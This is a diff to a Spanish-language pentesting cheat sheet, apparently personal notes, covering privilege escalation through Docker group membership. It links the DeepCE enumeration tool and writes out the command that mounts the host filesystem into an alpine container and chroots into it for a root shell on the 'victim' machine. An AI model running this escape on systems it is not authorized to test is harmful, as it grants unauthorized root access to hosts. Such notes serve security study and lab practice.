@@ -25,8 +25,6 @@ sudo = Si estas en estre grupo y disponemos de la passwd del usuario, podemos ej
 
 ## Docker
 
-### Forma 1
-
 DeepCE significa Docker Enumeration, Escalation of Privileges and Container Escapes. Está específicamente pensado para cuando ya tienes acceso a un contenedor Linux/Docker y quieres determinar si existe una vía para interactuar con el host o escapar del contenedor.
 
 * [Deepce](https://github.com/stealthcopter/deepce)
@@ -38,14 +36,14 @@ DeepCE significa Docker Enumeration, Escalation of Privileges and Container Esca
 ❯ chmod +x deepce.sh 
 ❯ ./deepce.sh   
 ```
-#### Escalar a Root
+### Forma 1 - Escalar a Root
 * [docker-group.md](https://stealthcopter.github.io/deepce/guides/docker-group.md)
 ```bash 
-# Ejecutar el comando en la máquina víctima para ser root
+# Escanear con 'deepce.sh'
+# Si muestra esa vulne, ejecutar el comando para ser root
 ❯ docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/bash   
 ```
-
-### Forma 2
+### Forma 2 - Manual 
 ```bash 
 docker = Si estas en este grupo puedes usar los siguientes comandos:
 ❯ docker images                # Mirar las imagenes existentes 
